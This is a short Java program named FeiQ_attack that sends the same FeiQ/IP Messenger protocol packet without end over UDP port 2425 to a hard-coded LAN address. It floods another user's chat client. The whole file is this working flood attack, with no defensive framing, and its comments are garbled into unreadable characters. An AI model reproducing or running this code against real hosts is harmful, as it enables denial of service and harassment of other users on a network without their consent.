package day2_IP;

import java.io.IOException;  
import java.net.DatagramPacket;  
import java.net.DatagramSocket;  
import java.net.InetAddress;  
import java.net.InetSocketAddress;  
import java.net.SocketException;  
import java.util.Scanner;  
  
public class FeiQ_attack {  
  
    @SuppressWarnings("resource")  
    public static void main(String[] args) throws IOException {  
        //�������ݰ��ӿڶ���  
        DatagramSocket da = new DatagramSocket();  
        while(true){  
            //����ַ���Ϊ������𶯱���  
            String a="1_lbt4_0#128#000C29D68D8F#0#0#0#2.5a:1399716676:%s:%s:209:.";  
            byte[] by = a.getBytes();  
            while(true){  
                //װ��  
                DatagramPacket daPacket = new DatagramPacket(by, by.length,  
                        //�˿ں�Ϊ�����udp�˿ںţ�  
                        //IPΪ�������Ե�ip  
                InetAddress.getByName("192.168.79.57"), 2425);  
//              ����  
                da.send(daPacket);  
            }  
        }  
    }
    }